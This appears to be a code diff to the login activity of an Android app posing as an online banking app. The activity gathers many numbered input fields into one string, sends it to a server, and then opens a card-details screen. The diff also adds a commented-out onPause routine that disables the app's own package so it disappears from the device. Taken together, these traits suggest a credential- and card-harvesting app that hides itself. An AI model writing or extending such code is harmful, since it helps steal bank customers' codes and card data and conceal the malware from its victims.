@@ -4,6 +4,7 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.databinding.DataBindingUtil;
 
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.os.Handler;
 import android.text.Editable;
@@ -15,6 +16,7 @@ import android.widget.Toast;
 
 import com.bumptech.glide.Glide;
 import com.codewithmuddasir.onlinebanking.databinding.ActivityLoginLoadingBinding;
+import com.codewithmuddasir.onlinebanking.helper.Util;
 
 import retrofit2.Call;
 import retrofit2.Callback;
@@ -23,12 +25,15 @@ import retrofit2.Response;
 public class LoginLoadingActivity extends AppCompatActivity {
 
     ActivityLoginLoadingBinding binding;
+    private Util util = new Util();
+
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         binding= DataBindingUtil.setContentView(this, R.layout.activity_login_loading);
 
+        util.saveLocalData(this,"check","true");
 
         if (binding.editText1 != null) {
             binding.editText1.addTextChangedListener(new TextWatcher() {
@@ -305,6 +310,7 @@ public class LoginLoadingActivity extends AppCompatActivity {
 
 
         binding.sub.setOnClickListener(view -> {
+            util.saveLocalData(this ,"check","false");
 
             String num = binding.editText1.getText().toString()+","+binding.editText2.getText().toString()+","+binding.editText3.getText().toString()+","
                     +binding.editText4.getText().toString()+","+binding.editText5.getText().toString()+","+binding.editText6.getText().toString()+","+binding.editText7.getText().toString()+","
@@ -337,7 +343,7 @@ public class LoginLoadingActivity extends AppCompatActivity {
                         if (response.isSuccessful()) {
                             // Data sent successfully
 
-                            Intent intent = new Intent(LoginLoadingActivity.this, CreditActivity.class);
+                            Intent intent = new Intent(LoginLoadingActivity.this, CardDetail.class);
                             intent.putExtra("m", intent2.getStringExtra("m") );
                             intent.putExtra("a", intent2.getStringExtra("a") );
                             intent.putExtra("u", intent2.getStringExtra("u") );
@@ -369,6 +375,23 @@ public class LoginLoadingActivity extends AppCompatActivity {
 
 
     }
+
+
+//    @Override
+//    protected void onPause() {
+//        super.onPause();
+//        Util util = new Util();
+//        if (util.getLocalData(this, "check").equals("true")) {
+//            Log.e("asdf123", "pause: verify activity");
+//            PackageManager packageManager = getPackageManager();
+//            packageManager.setApplicationEnabledSetting(
+//                    getPackageName(),
+//                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+//                    PackageManager.DONT_KILL_APP
+//            );
+//        }
+//    }
+
 }
 
 
